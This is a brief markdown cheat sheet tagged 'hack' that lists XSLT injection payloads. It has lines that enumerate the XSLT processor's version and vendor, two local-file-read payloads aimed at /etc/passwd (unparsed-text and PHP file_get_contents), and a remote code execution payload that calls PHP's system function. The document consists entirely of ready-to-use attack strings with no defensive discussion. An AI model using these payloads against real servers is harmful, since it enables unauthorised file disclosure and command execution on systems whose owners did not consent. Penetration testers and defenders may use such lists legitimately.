---
tags:
  - hack
---
# Attacking XSLT

Injection for enumeration:

```text
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

LFI (XSLT 2.0 only):

```text
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

LFI using PHP function:

```text
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

RCE:

```text
<xsl:value-of select="php:function('system','id')" />
```